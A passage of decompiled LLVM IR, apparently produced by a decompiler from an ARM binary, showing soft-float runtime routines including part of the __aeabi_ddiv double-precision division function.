  %v6_1a494 = icmp slt i32 %v1_1a48c, 32
  br i1 %v6_1a494, label %dec_label_pc_1a498, label %dec_label_pc_1a4fc

dec_label_pc_1a498:                               ; preds = %bb6
  %v1_1a498 = add i32 %v2_1a490, 12
  %v8_1a49c = icmp sgt i32 %v1_1a498, 0
  br i1 %v8_1a49c, label %dec_label_pc_1a4d0, label %dec_label_pc_1a4a0

dec_label_pc_1a4a0:                               ; preds = %dec_label_pc_1a498
  %v1_1a4a0 = add i32 %v2_1a490, 32
  %v1_1a4a4 = sub i32 0, %v2_1a490
  %v0_1a4a8 = load i32, i32* @r1, align 4
  %v6_1a4a8 = shl i32 %v0_1a4a8, %v1_1a4a4
  %v2_1a4ac = add i32 %v2_1a490, 31
  %v3_1a4ac = shl i32 1, %v2_1a4ac
  %v6_1a4ac = lshr i32 %v0_1a4a8, %v1_1a4a0
  %v1_1a4b0 = load i32, i32* %r0.global-to-local, align 4
  %v7_1a4b0 = shl i32 %v1_1a4b0, %v1_1a4a4
  %v8_1a4b0 = or i32 %v7_1a4b0, %v6_1a4ac
  %v1_1a4b4 = and i32 %v1_1a4b0, -2147483648
  %tmp = bitcast i32 %v1_1a4b0 to float
  %tmp13 = call float @fabsf(float %tmp)
  %v1_1a4b8 = bitcast float %tmp13 to i32
  %tmp14 = icmp slt i32 %v6_1a4a8, 0
  %v4_1a4bc = zext i1 %tmp14 to i32
  %v5_1a4bc = add i32 %v8_1a4b0, %v4_1a4bc
  store i32 %v5_1a4bc, i32* @r1, align 4
  %v5_1a4c0 = and i32 %v1_1a4b8, %v3_1a4ac
  %v6_1a4c0 = icmp ne i32 %v5_1a4c0, 0
  %v7_1a4c0 = lshr i32 %v1_1a4b8, %v1_1a4a0
  %v9_1a4c0 = add i32 %v7_1a4c0, %v1_1a4b4
  %v10_1a4c0 = zext i1 %v6_1a4c0 to i32
  %v11_1a4c0 = add i32 %v9_1a4c0, %v10_1a4c0
  store i32 %v11_1a4c0, i32* %r0.global-to-local, align 4
  %v19_1a4c0 = add i32 %v11_1a4c0, %v10_1a4c0
  %v20_1a4c0 = xor i32 %v19_1a4c0, %v1_1a4b0
  %v21_1a4c0 = xor i32 %v19_1a4c0, %v7_1a4c0
  %v22_1a4c0 = and i32 %v20_1a4c0, %v21_1a4c0
  %v23_1a4c0 = icmp slt i32 %v22_1a4c0, 0
  store i1 %v23_1a4c0, i1* @cpsr_v, align 1
  %v0_1a4c4 = load i32, i32* @lr, align 4
  %v3_1a4c4 = mul i32 %v6_1a4a8, 2
  %v4_1a4c4 = or i32 %v0_1a4c4, %v3_1a4c4
  %v5_1a4c4 = icmp slt i32 %v4_1a4c4, 0
  store i1 %v5_1a4c4, i1* @cpsr_n, align 1
  %v6_1a4c4 = icmp eq i32 %v4_1a4c4, 0
  store i1 %v6_1a4c4, i1* @cpsr_z, align 1
  br i1 %v6_1a4c4, label %bb7, label %bb8

bb7:                                              ; preds = %dec_label_pc_1a4a0
  %tmp15 = sext i1 %tmp14 to i32
  %v6_1a4c8 = add nsw i32 %tmp15, -1
  %v7_1a4c8 = and i32 %v5_1a4bc, %v6_1a4c8
  store i32 %v7_1a4c8, i32* @r1, align 4
  br label %bb8

bb8:                                              ; preds = %dec_label_pc_1a4a0, %bb7
  store i32 %tmp4, i32* @r4, align 4
  store i32 %tmp3, i32* @r5, align 4
  store i32 %tmp2, i32* @r6, align 4
  ret i32 %v11_1a4c0

dec_label_pc_1a4d0:                               ; preds = %dec_label_pc_1a498
  %v1_1a4d0 = sub i32 0, %v2_1a490
  %v1_1a4d4 = add i32 %v2_1a490, 32
  %v0_1a4d8 = load i32, i32* @r1, align 4
  %v6_1a4d8 = shl i32 %v0_1a4d8, %v1_1a4d0
  %v6_1a4dc = lshr i32 %v0_1a4d8, %v1_1a4d4
  %v1_1a4e0 = load i32, i32* %r0.global-to-local, align 4
  %v7_1a4e0 = shl i32 %v1_1a4e0, %v1_1a4d0
  %v8_1a4e0 = or i32 %v7_1a4e0, %v6_1a4dc
  %v1_1a4e4 = and i32 %v1_1a4e0, -2147483648
  %tmp16 = icmp slt i32 %v6_1a4d8, 0
  %v4_1a4e8 = zext i1 %tmp16 to i32
  %v5_1a4e8 = add i32 %v8_1a4e0, %v4_1a4e8
  store i32 %v5_1a4e8, i32* @r1, align 4
  %v6_1a4e8 = icmp ult i32 %v5_1a4e8, %v8_1a4e0
  %v2_1a4ec = zext i1 %v6_1a4e8 to i32
  %v3_1a4ec = or i32 %v2_1a4ec, %v1_1a4e4
  store i32 %v3_1a4ec, i32* %r0.global-to-local, align 4
  %v9_1a4ec = add nsw i32 %v3_1a4ec, %v2_1a4ec
  %v10_1a4ec = sub i32 0, %v1_1a4e0
  %v11_1a4ec = and i32 %v9_1a4ec, %v10_1a4ec
  %v12_1a4ec = icmp slt i32 %v11_1a4ec, 0
  store i1 %v12_1a4ec, i1* @cpsr_v, align 1
  %v0_1a4f0 = load i32, i32* @lr, align 4
  %v3_1a4f0 = mul i32 %v6_1a4d8, 2
  %v4_1a4f0 = or i32 %v0_1a4f0, %v3_1a4f0
  %v5_1a4f0 = icmp slt i32 %v4_1a4f0, 0
  store i1 %v5_1a4f0, i1* @cpsr_n, align 1
  %v6_1a4f0 = icmp eq i32 %v4_1a4f0, 0
  store i1 %v6_1a4f0, i1* @cpsr_z, align 1
  br i1 %v6_1a4f0, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_1a4d0
  %tmp17 = sext i1 %tmp16 to i32
  %v6_1a4f4 = add nsw i32 %tmp17, -1
  %v7_1a4f4 = and i32 %v5_1a4e8, %v6_1a4f4
  store i32 %v7_1a4f4, i32* @r1, align 4
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_1a4d0, %bb9
  store i32 %tmp4, i32* @r4, align 4
  store i32 %tmp3, i32* @r5, align 4
  store i32 %tmp2, i32* @r6, align 4
  ret i32 %v3_1a4ec

dec_label_pc_1a4fc:                               ; preds = %bb6
  %v1_1a4fc = sub i32 32, %v2_1a490
  %v0_1a500 = load i32, i32* @lr, align 4
  %v1_1a500 = load i32, i32* @r1, align 4
  %v7_1a500 = shl i32 %v1_1a500, %v1_1a4fc
  %v8_1a500 = or i32 %v7_1a500, %v0_1a500
  %v6_1a504 = lshr i32 %v1_1a500, %v2_1a490
  %v1_1a508 = load i32, i32* %r0.global-to-local, align 4
  %v7_1a508 = shl i32 %v1_1a508, %v1_1a4fc
  %v8_1a508 = or i32 %v7_1a508, %v6_1a504
  %v6_1a50c = lshr i32 %v1_1a508, %v2_1a490
  %v1_1a510 = and i32 %v1_1a508, -2147483648
  store i32 %v1_1a510, i32* %r0.global-to-local, align 4
  %v7_1a514 = lshr i32 %v1_1a510, %v2_1a490
  %v8_1a514 = sub i32 -1, %v7_1a514
  %v9_1a514 = and i32 %v6_1a50c, %v8_1a514
  %tmp18 = icmp slt i32 %v8_1a508, 0
  %v4_1a518 = zext i1 %tmp18 to i32
  %v5_1a518 = add i32 %v4_1a518, %v9_1a514
  store i32 %v5_1a518, i32* @r1, align 4
  %v3_1a51c = mul i32 %v8_1a508, 2
  %v4_1a51c = or i32 %v8_1a500, %v3_1a51c
  %v5_1a51c = icmp slt i32 %v4_1a51c, 0
  store i1 %v5_1a51c, i1* @cpsr_n, align 1
  %v6_1a51c = icmp eq i32 %v4_1a51c, 0
  store i1 %v6_1a51c, i1* @cpsr_z, align 1
  br i1 %v6_1a51c, label %bb11, label %bb12

bb11:                                             ; preds = %dec_label_pc_1a4fc
  %tmp19 = sext i1 %tmp18 to i32
  %v6_1a520 = add nsw i32 %tmp19, -1
  %v7_1a520 = and i32 %v5_1a518, %v6_1a520
  store i32 %v7_1a520, i32* @r1, align 4
  br label %bb12

bb12:                                             ; preds = %dec_label_pc_1a4fc, %bb11
  store i32 %tmp4, i32* @r4, align 4
  store i32 %tmp3, i32* @r5, align 4
  store i32 %tmp2, i32* @r6, align 4
  ret i32 %v1_1a510

dec_label_pc_1a5e0:                               ; preds = %dec_label_pc_1a478
  %v0_1a5e0 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a5e0 = and i32 %v0_1a5e0, -2147483648
  %v1_1a5e8 = or i32 %v1_1a5e0, 2146435072
  store i32 %v1_1a5e8, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %tmp4, i32* @r4, align 4
  store i32 %tmp3, i32* @r5, align 4
  store i32 %tmp2, i32* @r6, align 4
  ret i32 %v1_1a5e8

; uselistorder directives
  uselistorder i32 %v3_1a4ec, { 2, 0, 1 }
  uselistorder i32 %v8_1a4e0, { 1, 0 }
  uselistorder i32 %v1_1a4d0, { 1, 0 }
  uselistorder i32 %v11_1a4c0, { 1, 0, 2 }
  uselistorder i32 %v1_1a4b0, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1a4a4, { 1, 0 }
  uselistorder i32 %v2_1a490, { 5, 6, 7, 9, 0, 1, 2, 3, 4, 8 }
  uselistorder i32 %v1_1a48c, { 1, 0 }
  uselistorder i32 %v4_1a47c, { 1, 2, 0 }
  uselistorder i32 %v0_1a47c, { 3, 2, 1, 4, 0, 5 }
  uselistorder i32 %tmp4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp3, { 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp2, { 4, 3, 2, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 6, 0, 7, 1, 8, 2, 9, 3, 10, 4, 5 }
  uselistorder i32 12, { 29, 30, 49, 50, 51, 0, 52, 5, 53, 17, 10, 11, 3, 56, 12, 8, 73, 74, 75, 76, 77, 78, 9, 79, 80, 81, 82, 83, 84, 13, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 14, 18, 48, 65, 19, 20, 67, 68, 69, 1, 21, 70, 6, 71, 7, 22, 2, 72, 15, 57, 58, 59, 60, 85, 4, 44, 54, 55, 23, 24, 25, 26, 27, 28, 45, 46, 47, 61, 62, 63, 16, 64, 66 }
  uselistorder i32 -32, { 2, 1, 3, 4, 5, 6, 10, 7, 11, 12, 8, 0, 9 }
  uselistorder i32 54, { 2, 0, 3, 1 }
  uselistorder label %bb12, { 1, 0 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @function_1a5f4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1a5f4:
  %v1_1a5f8 = or i32 %arg1, 2146959360
  ret i32 %v1_1a5f8
}

define i32 @__aeabi_ddiv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1a600 = load i32, i32* @r4, align 4
  store i32 %v3_1a600, i32* %stack_var_-16, align 4
  %v6_1a600 = load i32, i32* @r5, align 4
  %v9_1a600 = load i32, i32* @r6, align 4
  store i32 2047, i32* %ip.global-to-local, align 4
  %v1_1a60c = load i32, i32* %r0.global-to-local, align 4
  %v4_1a60c = udiv i32 %v1_1a60c, 1048576
  %v5_1a60c = urem i32 %v4_1a60c, 2048
  store i32 %v5_1a60c, i32* @r4, align 4
  %v6_1a60c = icmp eq i32 %v5_1a60c, 0
  br i1 %v6_1a60c, label %entry..thread2_crit_edge, label %bb

entry..thread2_crit_edge:                         ; preds = %entry
  %.pre150 = udiv i32 %arg3, 1048576
  br label %.thread2

bb:                                               ; preds = %entry
  %v5_1a610 = udiv i32 %arg3, 1048576
  %v6_1a610 = urem i32 %v5_1a610, 2048
  store i32 %v6_1a610, i32* %r5.global-to-local, align 4
  %v7_1a610 = icmp eq i32 %v6_1a610, 0
  br i1 %v7_1a610, label %.thread1, label %bb92

.thread1:                                         ; preds = %bb
  br label %dec_label_pc_1a794

bb92:                                             ; preds = %bb
  %v5_1a614 = icmp eq i32 %v5_1a60c, 2047
  br i1 %v5_1a614, label %.thread2, label %bb93

.thread2:                                         ; preds = %entry..thread2_crit_edge, %bb92
  %.pre148.pre-phi = phi i32 [ %.pre150, %entry..thread2_crit_edge ], [ %v5_1a610, %bb92 ]
  br label %dec_label_pc_1a794

bb93:                                             ; preds = %bb92
  %v5_1a618 = icmp eq i32 %v6_1a610, 2047
  br i1 %v5_1a618, label %dec_label_pc_1a794, label %dec_label_pc_1a620

dec_label_pc_1a620:                               ; preds = %bb93
  %v2_1a620 = sub nsw i32 %v5_1a60c, %v6_1a610
  store i32 %v2_1a620, i32* %r4.global-to-local, align 4
  %v2_1a624 = xor i32 %v1_1a60c, %arg3
  %v4_1a628 = mul i32 %arg3, 4096
  %v5_1a628 = or i32 %v4_1a628, %arg4
  store i32 %v5_1a628, i32* %r5.global-to-local, align 4
  %v7_1a628 = icmp eq i32 %v5_1a628, 0
  %v3_1a62c = mul i32 %v1_1a60c, 4096
  store i32 %v3_1a62c, i32* %r0.global-to-local, align 4
  br i1 %v7_1a628, label %dec_label_pc_1a764, label %dec_label_pc_1a634

dec_label_pc_1a634:                               ; preds = %dec_label_pc_1a620
  %tmp94 = mul i32 %arg3, 256
  %v4_1a63c = and i32 %tmp94, 268435200
  %v4_1a640 = udiv i32 %arg4, 16777216
  %v5_1a63c = or i32 %v4_1a640, %v4_1a63c
  %v5_1a640 = or i32 %v5_1a63c, 268435456
  store i32 %v5_1a640, i32* %r2.global-to-local, align 4
  %v3_1a644 = mul i32 %arg4, 256
  store i32 %v3_1a644, i32* %r3.global-to-local, align 4
  %tmp95 = mul i32 %v1_1a60c, 256
  %v4_1a648 = and i32 %tmp95, 268435200
  %v1_1a64c = load i32, i32* @r1, align 4
  %v4_1a64c = udiv i32 %v1_1a64c, 16777216
  %v5_1a648 = or i32 %v4_1a648, %v4_1a64c
  %v5_1a64c = or i32 %v5_1a648, 268435456
  store i32 %v5_1a64c, i32* %r5.global-to-local, align 4
  %v3_1a650 = mul i32 %v1_1a64c, 256
  store i32 %v3_1a650, i32* %r6.global-to-local, align 4
  %v1_1a654 = and i32 %v2_1a624, -2147483648
  store i32 %v1_1a654, i32* %r0.global-to-local, align 4
  %v3_1a658 = icmp uge i32 %v5_1a64c, %v5_1a640
  %v9_1a658 = icmp eq i32 %v5_1a64c, %v5_1a640
  br i1 %v9_1a658, label %bb96, label %bb97

bb96:                                             ; preds = %dec_label_pc_1a634
  %v4_1a65c = icmp uge i32 %v3_1a650, %v3_1a644
  br label %bb97

bb97:                                             ; preds = %dec_label_pc_1a634, %bb96
  %v1_1a660 = phi i1 [ %v3_1a658, %dec_label_pc_1a634 ], [ %v4_1a65c, %bb96 ]
  %v2_1a660 = add nsw i32 %v2_1a620, 253
  %v3_1a660 = zext i1 %v1_1a660 to i32
  %v4_1a660 = add nsw i32 %v2_1a660, %v3_1a660
  %v8_1a660 = icmp ule i32 %v4_1a660, %v2_1a620
  %v9_1a660 = icmp ugt i32 %v2_1a620, -254
  %v10_1a660 = select i1 %v1_1a660, i1 %v8_1a660, i1 %v9_1a660
  %v1_1a664 = add nsw i32 %v4_1a660, 768
  store i32 %v1_1a664, i32* %r4.global-to-local, align 4
  br i1 %v10_1a660, label %dec_label_pc_1a674, label %dec_label_pc_1a66c

dec_label_pc_1a66c:                               ; preds = %bb97
  %v3_1a66c = udiv i32 %v5_1a640, 2
  store i32 %v3_1a66c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1a674

dec_label_pc_1a674:                               ; preds = %bb97, %dec_label_pc_1a66c
  %v0_1a67c = phi i32 [ %v5_1a640, %bb97 ], [ %v3_1a66c, %dec_label_pc_1a66c ]
  %v0_1a680 = phi i32 [ %v3_1a644, %bb97 ], [ 0, %dec_label_pc_1a66c ]
  %v2_1a674 = sub i32 %v3_1a650, %v0_1a680
  store i32 %v2_1a674, i32* %r6.global-to-local, align 4
  %v3_1a674 = icmp uge i32 %v3_1a650, %v0_1a680
  %v3_1a678 = icmp eq i1 %v3_1a674, false
  %v4_1a678 = sub nsw i32 %v5_1a64c, %v0_1a67c
  %v6_1a678 = sext i1 %v3_1a678 to i32
  %v7_1a678 = add nsw i32 %v6_1a678, %v4_1a678
  store i32 %v7_1a678, i32* %r5.global-to-local, align 4
  %v3_1a67c = udiv i32 %v0_1a67c, 2
  store i32 %v3_1a67c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1a68c.outer

dec_label_pc_1a68c.outer:                         ; preds = %dec_label_pc_1a724, %dec_label_pc_1a674
  %v1_1a738.ph = phi i32 [ %v2_1a724, %dec_label_pc_1a724 ], [ %v1_1a654, %dec_label_pc_1a674 ]
  %v0_1a690.ph = phi i32 [ %v5_1a700, %dec_label_pc_1a724 ], [ %v7_1a678, %dec_label_pc_1a674 ]
  %v1_1a694.ph = phi i32 [ %v3_1a704, %dec_label_pc_1a724 ], [ %v2_1a674, %dec_label_pc_1a674 ]
  %v5_1a70c17.ph = phi i32 [ %v5_1a70c, %dec_label_pc_1a724 ], [ %v3_1a67c, %dec_label_pc_1a674 ]
  %v3_1a71013.ph = phi i32 [ %v3_1a710, %dec_label_pc_1a724 ], [ 0, %dec_label_pc_1a674 ]
  %storemerge136 = phi i32 [ 0, %dec_label_pc_1a724 ], [ 1048576, %dec_label_pc_1a674 ]
  %storemerge = phi i32 [ -2147483648, %dec_label_pc_1a724 ], [ 524288, %dec_label_pc_1a674 ]
  store i32 %storemerge136, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1a68c

dec_label_pc_1a68c:                               ; preds = %dec_label_pc_1a68c.outer, %dec_label_pc_1a6fc
  %v1_1a6f059 = phi i32 [ %v2_1a738, %dec_label_pc_1a6fc ], [ %storemerge136, %dec_label_pc_1a68c.outer ]
  %v1_1a69c = phi i32 [ %v1_1a69c32, %dec_label_pc_1a6fc ], [ %storemerge136, %dec_label_pc_1a68c.outer ]
  %v1_1a6b841 = phi i32 [ %v1_1a6b843, %dec_label_pc_1a6fc ], [ %storemerge136, %dec_label_pc_1a68c.outer ]
  %v1_1a6d450 = phi i32 [ %v1_1a6d452, %dec_label_pc_1a6fc ], [ %storemerge136, %dec_label_pc_1a68c.outer ]
  %v0_1a714 = phi i32 [ %v3_1a714, %dec_label_pc_1a6fc ], [ %storemerge, %dec_label_pc_1a68c.outer ]
  %v0_1a690 = phi i32 [ %v5_1a700, %dec_label_pc_1a6fc ], [ %v0_1a690.ph, %dec_label_pc_1a68c.outer ]
  %v1_1a694 = phi i32 [ %v3_1a704, %dec_label_pc_1a6fc ], [ %v1_1a694.ph, %dec_label_pc_1a68c.outer ]
  %v5_1a70c17 = phi i32 [ %v5_1a70c, %dec_label_pc_1a6fc ], [ %v5_1a70c17.ph, %dec_label_pc_1a68c.outer ]
  %v3_1a71013 = phi i32 [ %v3_1a710, %dec_label_pc_1a6fc ], [ %v3_1a71013.ph, %dec_label_pc_1a68c.outer ]
  %v3_1a68c = icmp uge i32 %v1_1a694, %v3_1a71013
  %v3_1a690 = icmp eq i1 %v3_1a68c, false
  %v4_1a690 = sub i32 %v0_1a690, %v5_1a70c17
  %v6_1a690 = sext i1 %v3_1a690 to i32
  %v7_1a690 = add i32 %v6_1a690, %v4_1a690
  %v8_1a690 = zext i1 %v3_1a690 to i32
  %v9_1a690 = sub i32 %v7_1a690, %v8_1a690
  %v10_1a690 = icmp ult i32 %v0_1a690, %v9_1a690
  %v11_1a690 = icmp ne i32 %v5_1a70c17, -1
  %v12_1a690 = or i1 %v11_1a690, %v10_1a690
  %v13_1a690 = icmp ult i32 %v0_1a690, %v5_1a70c17
  %v14_1a690 = select i1 %v3_1a690, i1 %v12_1a690, i1 %v13_1a690
  br i1 %v14_1a690, label %.thread4, label %bb98

bb98:                                             ; preds = %dec_label_pc_1a68c
  %v3_1a694 = sub i32 %v1_1a694, %v3_1a71013
  store i32 %v3_1a694, i32* %r6.global-to-local, align 4
  store i32 %v7_1a690, i32* %r5.global-to-local, align 4
  %v3_1a69c = or i32 %v1_1a69c, %v0_1a714
  store i32 %v3_1a69c, i32* %r1.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1a68c, %bb98
  %v1_1a6f058 = phi i32 [ %v1_1a6f059, %dec_label_pc_1a68c ], [ %v3_1a69c, %bb98 ]
  %v1_1a69c35 = phi i32 [ %v1_1a69c, %dec_label_pc_1a68c ], [ %v3_1a69c, %bb98 ]
  %v1_1a6b8 = phi i32 [ %v1_1a6b841, %dec_label_pc_1a68c ], [ %v3_1a69c, %bb98 ]
  %v1_1a6d449 = phi i32 [ %v1_1a6d450, %dec_label_pc_1a68c ], [ %v3_1a69c, %bb98 ]
  %v0_1a6ac = phi i32 [ %v0_1a690, %dec_label_pc_1a68c ], [ %v7_1a690, %bb98 ]
  %v1_1a6b0 = phi i32 [ %v1_1a694, %dec_label_pc_1a68c ], [ %v3_1a694, %bb98 ]
  %v1_1a6a0 = urem i32 %v5_1a70c17, 2
  %v2_1a6a0 = icmp ne i32 %v1_1a6a0, 0
  %v3_1a6a0 = udiv i32 %v5_1a70c17, 2
  %v3_1a6a4 = zext i1 %v2_1a6a0 to i32
  %v6_1a6a4 = zext i32 %v3_1a71013 to i64
  %v7_1a6a4 = sub i32 33, %v3_1a71013
  %v8_1a6a4 = zext i32 %v7_1a6a4 to i64
  %v9_1a6a4 = shl i64 %v6_1a6a4, %v8_1a6a4
  %v10_1a6a4 = sub i32 32, %v3_1a71013
  %v11_1a6a4 = shl i32 %v3_1a6a4, %v10_1a6a4
  %v12_1a6a4 = zext i32 %v11_1a6a4 to i64
  %v14_1a6a4 = or i64 %v12_1a6a4, %v9_1a6a4
  %v15_1a6a4 = trunc i64 %v14_1a6a4 to i32
  %v3_1a6a8 = icmp uge i32 %v1_1a6b0, %v15_1a6a4
  %v3_1a6ac = icmp eq i1 %v3_1a6a8, false
  %v4_1a6ac = sub i32 %v0_1a6ac, %v3_1a6a0
  %v6_1a6ac = sext i1 %v3_1a6ac to i32
  %v7_1a6ac = add i32 %v6_1a6ac, %v4_1a6ac
  %v13_1a6ac = icmp ult i32 %v0_1a6ac, %v3_1a6a0
  %v14_1a6ac = or i1 %v13_1a6ac, %v3_1a6ac
  br i1 %v14_1a6ac, label %.thread6, label %bb99

bb99:                                             ; preds = %.thread4
  %v3_1a6b0 = sub i32 %v1_1a6b0, %v15_1a6a4
  store i32 %v3_1a6b0, i32* %r6.global-to-local, align 4
  store i32 %v7_1a6ac, i32* %r5.global-to-local, align 4
  %v5_1a6b8 = udiv i32 %v0_1a714, 2
  %v6_1a6b8 = or i32 %v1_1a6b8, %v5_1a6b8
  store i32 %v6_1a6b8, i32* %r1.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %.thread4, %bb99
  %v1_1a6f057 = phi i32 [ %v1_1a6f058, %.thread4 ], [ %v6_1a6b8, %bb99 ]
  %v1_1a69c34 = phi i32 [ %v1_1a69c35, %.thread4 ], [ %v6_1a6b8, %bb99 ]
  %v1_1a6b845 = phi i32 [ %v1_1a6b8, %.thread4 ], [ %v6_1a6b8, %bb99 ]
  %v1_1a6d4 = phi i32 [ %v1_1a6d449, %.thread4 ], [ %v6_1a6b8, %bb99 ]
  %v0_1a6c8 = phi i32 [ %v0_1a6ac, %.thread4 ], [ %v7_1a6ac, %bb99 ]
  %v1_1a6cc = phi i32 [ %v1_1a6b0, %.thread4 ], [ %v3_1a6b0, %bb99 ]
  %v1_1a6bc = urem i32 %v3_1a6a0, 2
  %v2_1a6bc = icmp ne i32 %v1_1a6bc, 0
  %v3_1a6bc = udiv i32 %v5_1a70c17, 4
  %v3_1a6c0 = zext i1 %v2_1a6bc to i32
  %v6_1a6c0 = and i64 %v14_1a6a4, 4294967295
  %v7_1a6c0 = sub i32 33, %v15_1a6a4
  %v8_1a6c0 = zext i32 %v7_1a6c0 to i64
  %v9_1a6c0 = shl i64 %v6_1a6c0, %v8_1a6c0
  %v10_1a6c0 = sub i32 32, %v15_1a6a4
  %v11_1a6c0 = shl i32 %v3_1a6c0, %v10_1a6c0
  %v12_1a6c0 = zext i32 %v11_1a6c0 to i64
  %v14_1a6c0 = or i64 %v12_1a6c0, %v9_1a6c0
  %v15_1a6c0 = trunc i64 %v14_1a6c0 to i32
  %v3_1a6c4 = icmp uge i32 %v1_1a6cc, %v15_1a6c0
  %v3_1a6c8 = icmp eq i1 %v3_1a6c4, false
  %v4_1a6c8 = sub i32 %v0_1a6c8, %v3_1a6bc
  %v6_1a6c8 = sext i1 %v3_1a6c8 to i32
  %v7_1a6c8 = add i32 %v6_1a6c8, %v4_1a6c8
  %v13_1a6c8 = icmp ult i32 %v0_1a6c8, %v3_1a6bc
  %v14_1a6c8 = or i1 %v13_1a6c8, %v3_1a6c8
  br i1 %v14_1a6c8, label %.thread8, label %bb100

bb100:                                            ; preds = %.thread6
  %v3_1a6cc = sub i32 %v1_1a6cc, %v15_1a6c0
  store i32 %v3_1a6cc, i32* %r6.global-to-local, align 4
  store i32 %v7_1a6c8, i32* %r5.global-to-local, align 4
  %v5_1a6d4 = udiv i32 %v0_1a714, 4
  %v6_1a6d4 = or i32 %v1_1a6d4, %v5_1a6d4
  store i32 %v6_1a6d4, i32* %r1.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %.thread6, %bb100
  %v1_1a6f0 = phi i32 [ %v1_1a6f057, %.thread6 ], [ %v6_1a6d4, %bb100 ]
  %v1_1a69c33 = phi i32 [ %v1_1a69c34, %.thread6 ], [ %v6_1a6d4, %bb100 ]
  %v1_1a6b844 = phi i32 [ %v1_1a6b845, %.thread6 ], [ %v6_1a6d4, %bb100 ]
  %v1_1a6d453 = phi i32 [ %v1_1a6d4, %.thread6 ], [ %v6_1a6d4, %bb100 ]
  %v0_1a6e4 = phi i32 [ %v0_1a6c8, %.thread6 ], [ %v7_1a6c8, %bb100 ]
  %v1_1a6e8 = phi i32 [ %v1_1a6cc, %.thread6 ], [ %v3_1a6cc, %bb100 ]
  %v1_1a6d8 = urem i32 %v3_1a6bc, 2
  %v2_1a6d8 = icmp ne i32 %v1_1a6d8, 0
  %v3_1a6d8 = udiv i32 %v5_1a70c17, 8
  %v3_1a6dc = zext i1 %v2_1a6d8 to i32
  %v6_1a6dc = and i64 %v14_1a6c0, 4294967295
  %v7_1a6dc = sub i32 33, %v15_1a6c0
  %v8_1a6dc = zext i32 %v7_1a6dc to i64
  %v9_1a6dc = shl i64 %v6_1a6dc, %v8_1a6dc
  %v10_1a6dc = sub i32 32, %v15_1a6c0
  %v11_1a6dc = shl i32 %v3_1a6dc, %v10_1a6dc
  %v12_1a6dc = zext i32 %v11_1a6dc to i64
  %v14_1a6dc = or i64 %v12_1a6dc, %v9_1a6dc
  %v15_1a6dc = trunc i64 %v14_1a6dc to i32
  %v3_1a6e0 = icmp uge i32 %v1_1a6e8, %v15_1a6dc
  %v3_1a6e4 = icmp eq i1 %v3_1a6e0, false
  %v4_1a6e4 = sub i32 %v0_1a6e4, %v3_1a6d8
  %v6_1a6e4 = sext i1 %v3_1a6e4 to i32
  %v7_1a6e4 = add i32 %v6_1a6e4, %v4_1a6e4
  %v13_1a6e4 = icmp ult i32 %v0_1a6e4, %v3_1a6d8
  %v14_1a6e4 = or i1 %v13_1a6e4, %v3_1a6e4
  br i1 %v14_1a6e4, label %.thread10, label %bb102

bb102:                                            ; preds = %.thread8
  %v3_1a6e8 = sub i32 %v1_1a6e8, %v15_1a6dc
  store i32 %v3_1a6e8, i32* %r6.global-to-local, align 4
  store i32 %v7_1a6e4, i32* %r5.global-to-local, align 4
  %v5_1a6f0 = udiv i32 %v0_1a714, 8
  %v6_1a6f0 = or i32 %v1_1a6f0, %v5_1a6f0
  store i32 %v6_1a6f0, i32* %r1.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread8, %bb102
  %v1_1a700 = phi i32 [ %v1_1a6e8, %.thread8 ], [ %v3_1a6e8, %bb102 ]
  %v0_1a6fc = phi i32 [ %v0_1a6e4, %.thread8 ], [ %v7_1a6e4, %bb102 ]
  %v2_1a738 = phi i32 [ %v1_1a6f0, %.thread8 ], [ %v6_1a6f0, %bb102 ]
  %v1_1a69c32 = phi i32 [ %v1_1a69c33, %.thread8 ], [ %v6_1a6f0, %bb102 ]
  %v1_1a6b843 = phi i32 [ %v1_1a6b844, %.thread8 ], [ %v6_1a6f0, %bb102 ]
  %v1_1a6d452 = phi i32 [ %v1_1a6d453, %.thread8 ], [ %v6_1a6f0, %bb102 ]
  %v2_1a6f4 = or i32 %v0_1a6fc, %v1_1a700
  %v4_1a6f4 = icmp eq i32 %v2_1a6f4, 0
  br i1 %v4_1a6f4, label %dec_label_pc_1a734, label %dec_label_pc_1a6fc

dec_label_pc_1a6fc:                               ; preds = %.thread10
  %v3_1a6fc = mul i32 %v0_1a6fc, 16
  %v4_1a700 = udiv i32 %v1_1a700, 268435456
  %v5_1a700 = or i32 %v3_1a6fc, %v4_1a700
  store i32 %v5_1a700, i32* %r5.global-to-local, align 4
  %v3_1a704 = mul i32 %v1_1a700, 16
  store i32 %v3_1a704, i32* %r6.global-to-local, align 4
  %v3_1a708 = mul nuw i32 %v3_1a6d8, 8
